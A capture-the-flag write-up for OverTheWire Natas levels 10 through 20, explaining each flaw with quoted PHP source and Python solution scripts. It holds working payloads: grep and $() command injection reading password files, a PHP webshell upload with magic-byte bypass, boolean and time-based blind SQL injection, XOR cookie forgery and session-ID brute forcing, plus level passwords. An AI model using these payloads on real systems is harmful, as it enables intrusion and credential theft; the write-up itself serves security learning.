# OverTheWire Natas Writeup (Levels 10-19)

---

## Level 10 → 11

### Vulnerability: Blind grep injection
Same as Level 9 — the `needle` parameter is passed directly to `grep`. Since `.` matches any character and `*` means zero or more, the payload:
```
.* /etc/natas_webpass/natas11
```
makes grep search that file in addition to `dictionary.txt`, and prints its contents.

---

## Level 11 → 12

### Source Code
```php
$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
        if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
                $mydata['showpassword'] = $tempdata['showpassword'];
                $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
        }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

### How it works
The server stores user preferences in a cookie as `base64(xor_encrypt(json_encode($data)))`. The XOR key is fixed and unknown, but since we know the plaintext (`{"showpassword":"no","bgcolor":"#ffffff"}`) and the ciphertext (our current cookie), we can recover the key:

```
key = plaintext XOR ciphertext
```

XOR is symmetric — if `C = P XOR K`, then `K = P XOR C`. The key repeats cyclically, so once we extract a few characters we find the repeating pattern.

### Solution Script
```python
import requests
import re
import base64

def flag(url, username, password, session, cookie_key, cookie_value):
    # URL-decode the cookie and base64-decode it to get raw XOR ciphertext
    url_decode = cookie_value[0].replace("%3D", "=")
    key = base64.b64decode(url_decode).decode('utf-8')

    # Known plaintext: the default JSON the server would have encoded
    data = '{"showpassword":"no","bgcolor":"#ffffff"}'

    # XOR ciphertext with known plaintext to recover the repeating key
    xor = ""
    for i in range(len(data)):
        xor += chr(ord(data[i]) ^ ord(key[i % len(key)]))

    # The key repeats every 4 chars
    og_key = xor[0:4]

    # Now forge a new cookie with showpassword = "yes"
    new_data = '{"showpassword":"yes","bgcolor":"#ffffff"}'
    xor = ""
    for i in range(len(new_data)):
        xor += chr(ord(new_data[i]) ^ ord(og_key[i % len(og_key)]))

    final_cookie = base64.b64encode(xor.encode()).decode('utf-8')
    headers = {"Cookie": cookie_key[0] + "=" + final_cookie.strip()}

    flag_site = session.get(url, auth=(username, password), headers=headers)
    flag = re.findall("password for natas12 is(.*)<br>", flag_site.text)
    print("The flag for natas11 is: " + flag[0].strip())

def login(url, username, password):
    session = requests.Session()
    site = session.get(url, auth=(username, password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    cookie_dict = session.cookies.get_dict()
    cookie_key = list(cookie_dict.keys())
    cookie_value = list(cookie_dict.values())
    flag(url, username, password, session, cookie_key, cookie_value)

if __name__ == "__main__":
    url = "http://natas11.natas.labs.overthewire.org/"
    username = "natas11"
    password = "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk"
    login(url, username, password)
```

**Step-by-step breakdown:**
1. Grab the current `data` cookie from the server.
2. Base64-decode it to get `xor_encrypt(json_encode($defaultdata))`.
3. XOR this against the known plaintext `{"showpassword":"no","bgcolor":"#ffffff"}` → recovers the repeating 4-character XOR key.
4. Re-XOR the new payload `{"showpassword":"yes",...}` with that recovered key.
5. Base64-encode the result and send it back as the cookie.
6. The server decodes it, sees `showpassword=yes`, and prints the password.

---

## Level 12 → 13

### Source Code (key parts)
```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        }
    }
}
```

### How it works
The file extension is taken from the **POST parameter `filename`**, not the actual uploaded file. The server blindly trusts whatever extension you send. So even if the form says `abc123.jpg`, we can intercept the request (e.g. with Burp Suite) and change `filename` to `shell.php`.

### Solution
Upload a PHP webshell, changing the `filename` field to end in `.php`:
```php
<?php echo system("cat /etc/natas_webpass/natas13"); ?>
```
The server saves it as `upload/<random>.php` and gives you a clickable link. Visit it to get the password.

---

## Level 13 → 14

### Source Code (added check)
```php
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```

### How it works
`exif_imagetype()` checks the **magic bytes** (file signature) at the start of the file — not the extension. A JPEG starts with `FF D8 FF`, a BMP starts with `BM`, etc. We can prepend a valid image magic byte string to our PHP payload to fool this check.

### Solution
Prepend the ASCII string `BMP` (which is a valid BMP file magic bytes representation) to the PHP payload:
```
BMP<?php echo system("cat /etc/natas_webpass/natas14"); ?>
```
Then upload this file while changing the `filename` POST parameter to `shell.php`. The `exif_imagetype()` check passes (sees BMP header), PHP executes the code after it, and the password is printed.

---

## Level 14 → 15

### Source Code
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    echo "Successful login! The password for natas15 is <censored><br>";
}
```

### How it works
The username and password are inserted directly into the SQL query with no sanitization. By injecting SQL into the username field, we can make the `WHERE` clause always true.

**Payload (username field):**
```
natas15" OR 1=1#
```
This transforms the query into:
```sql
SELECT * from users where username="natas15" OR 1=1# " and password="..."
```
The `#` comments out the rest, and `OR 1=1` is always true, returning all rows → login succeeds.

---

## Level 15 → 16

### Source Code
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
$res = mysqli_query($link, $query);
if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
}
```

### How it works
The page only tells us "user exists" or "doesn't exist" — no data is returned. But we can inject extra conditions to ask yes/no questions about the password character by character. Using `LIKE BINARY` (case-sensitive) and `ASCII(SUBSTRING(...))` with a **binary search** over ASCII values, we recover each character in ~7 requests instead of 62.

### Solution Script
```python
import requests
import sys

url = "http://natas15.natas.labs.overthewire.org/"
auth_creds = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
s = requests.Session()
s.auth = auth_creds

password = ""
print("Extracting password for natas16 using Binary Search...")

for position in range(1, 33):
    low = 48   # '0'
    high = 122 # 'z'

    while low <= high:
        mid = (low + high) // 2
        # Ask: is the ASCII value of char at [position] > mid?
        payload = f'natas16" AND ASCII(SUBSTRING(password, {position}, 1)) > {mid} AND "1"="1'
        r = s.post(url, data={'username': payload})

        if "This user exists" in r.text:
            low = mid + 1   # Char is in upper half
        else:
            high = mid - 1  # Char is in lower half or equal to mid

    # When loop ends, low == exact ASCII value
    extracted_char = chr(low)
    password += extracted_char
    sys.stdout.write(extracted_char)
    sys.stdout.flush()

print(f"\n\nSuccess! The password for natas16 is: {password}")
```

**Why binary search?** Instead of trying each of 62 characters one by one, we ask "is the value greater than the midpoint?" and halve the search space each time. 32 positions × ~7 requests = ~224 total requests instead of ~2000.

---

## Level 16 → 17

### Source Code
```php
if(preg_match('/[;|&`\'"]/', $key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
```

### How it works
The filter blocks `;`, `|`, `&`, backticks, and quotes — but **not** `$()` (dollar-sign subshell syntax). We can inject `$(command)` which gets executed by the shell and its output is substituted inline.

**The trick:** We use `grep` against the password file inside a subshell. If the grep finds a match, it returns the password as the search term for the outer grep — which finds nothing in `dictionary.txt` (empty output). If no match, the subshell returns nothing, and the outer grep searches for an empty string (dumps the entire dictionary — large output).

```
$(grep -E ^<known_prefix><char> /etc/natas_webpass/natas17)
```
- If the password starts with our prefix+char → subshell returns a match → outer grep finds nothing → **small response = correct character**
- If not → subshell returns empty → outer grep gets `""` → dumps entire dictionary → **large response = wrong character**

### Solution Script
```python
import requests
import sys
import string

url = "http://natas16.natas.labs.overthewire.org/"
auth_creds = ('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
charset = string.ascii_letters + string.digits
password = ""

print("Extracting natas17 password using the dictionary-dump technique...")

with requests.Session() as s:
    s.auth = auth_creds

    while len(password) < 32:
        for char in charset:
            payload = f"$(grep -E ^{password}{char} /etc/natas_webpass/natas17)"
            r = s.get(url, params={'needle': payload})

            if len(r.text) < 1200:  # Small response = correct char
                sys.stdout.write(char)
                sys.stdout.flush()
                password += char
                break

print(f"\n\nSuccess! The password for natas17 is: {password}")
```

---

## Level 17 → 18

### Source Code (key difference from Level 15)
```php
if(mysqli_num_rows($res) > 0) {
    //echo "This user exists.<br>";   // ← COMMENTED OUT
} else {
    //echo "This user doesn't exist.<br>";  // ← COMMENTED OUT
}
```

### How it works
This is identical to Level 15's SQL injection, except **all output is suppressed** — we can't use boolean-based detection anymore. Instead we use **time-based blind injection**: inject `AND SLEEP(3)` so that if our condition is true, the database pauses for 3 seconds. We set the HTTP timeout to 1.5 seconds — a timeout exception means the DB slept = the condition was true.

```sql
natas18" AND password LIKE BINARY "a%" AND SLEEP(3)-- 
```
- If password starts with `a` → DB sleeps 3s → request times out → **correct char**
- If not → DB returns instantly → request completes → **wrong char**

### Solution Script
```python
import requests
import string
import sys

TARGET_URL = "http://natas17.natas.labs.overthewire.org/"
AUTH_CREDS = ('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
CHARSET = string.ascii_letters + string.digits
SLEEP_DELAY = 3
TIMEOUT_THRESHOLD = 1.5

def extract_password():
    extracted_password = ""
    print("Initiating Time-Based SQLi attack (this may take a while)...")

    with requests.Session() as session:
        session.auth = AUTH_CREDS

        for _ in range(32):
            for guess_char in CHARSET:
                test_string = extracted_password + guess_char
                payload = f'natas18" AND password LIKE BINARY "{test_string}%" AND SLEEP({SLEEP_DELAY})-- '

                try:
                    session.post(TARGET_URL, data={'username': payload}, timeout=TIMEOUT_THRESHOLD)
                    # No timeout = condition was false = wrong char, continue
                except requests.exceptions.ReadTimeout:
                    # Timeout = DB slept = correct char!
                    extracted_password += guess_char
                    sys.stdout.write(guess_char)
                    sys.stdout.flush()
                    break

    print(f"\n\nSuccess! The password for natas18 is: {extracted_password}")

if __name__ == "__main__":
    extract_password()
```

---

## Level 18 → 19

### Source Code (key parts)
```php
$maxid = 640; // 640 should be enough for everyone

function createID($user) {
    global $maxid;
    return rand(1, $maxid);  // Session IDs are just random numbers 1-640!
}

function print_credentials() {
    if($_SESSION and $_SESSION["admin"] == 1) {
        print "Password: <censored>";
    }
}
```

### How it works
The `PHPSESSID` cookie is just a number between 1 and 640. If an admin has previously logged in, their session is stored server-side. We just try all 640 possible session IDs until we find one where `$_SESSION["admin"] == 1`.

### Solution Script
```python
import requests
import sys

TARGET_URL = "http://natas18.natas.labs.overthewire.org/index.php"
AUTH_CREDS = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
MAX_SESSIONS = 640

def brute_force_session():
    print("Initiating PHPSESSID brute-force attack...")

    with requests.Session() as session:
        session.auth = AUTH_CREDS

        for sess_id in range(1, MAX_SESSIONS + 1):
            sys.stdout.write(f"\rTesting Session ID: {sess_id} / {MAX_SESSIONS}")
            sys.stdout.flush()

            cookies = {'PHPSESSID': str(sess_id)}
            response = session.get(TARGET_URL, cookies=cookies)

            if "Login as an admin to retrieve" not in response.text:
                print(f"\n\n[+] Admin session found at ID: {sess_id}\n")
                print(response.text)
                return

    print("\n[-] Exhausted all session IDs.")

if __name__ == "__main__":
    brute_force_session()
```

**Result:** Found admin session at ID 119.

---

## Level 19 → 20

### How it works
The page says session IDs are "no longer sequential." By testing, we discover the format is:
```
<number>-admin   →   hex-encoded
```
For example, session 281 for user "admin" becomes `281-admin` → hex → `3238312d61646d696e`.

We brute-force numbers 1–1000, hex-encode `<n>-admin` each time, and send it as the `PHPSESSID` cookie.

### Solution Script
```python
import requests
import sys

class Natas19Solver:
    def __init__(self):
        self.url = "http://natas19.natas.labs.overthewire.org/index.php"
        self.credentials = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
        self.http_session = requests.Session()
        self.http_session.auth = self.credentials

    def generate_hex_cookie(self, session_id):
        raw_string = f"{session_id}-admin"
        return raw_string.encode('utf-8').hex()

    def execute_attack(self):
        print("[*] Starting bruteforce with hex-encoded session IDs...")

        for session_id in range(1, 1001):
            hex_cookie = self.generate_hex_cookie(session_id)
            sys.stdout.write(f"\r[~] ID {session_id:04d} -> {hex_cookie}")
            sys.stdout.flush()

            response = self.http_session.get(
                self.url,
                cookies={'PHPSESSID': hex_cookie}
            )

            if "Login as an admin to retrieve" not in response.text:
                print(f"\n\n[+] Admin found at ID: {session_id}, Cookie: {hex_cookie}\n")
                print(response.text.strip())
                break

if __name__ == "__main__":
    solver = Natas19Solver()
    solver.execute_attack()
```

**Result:** Admin found at ID 281, cookie `3238312d61646d696e`.

---
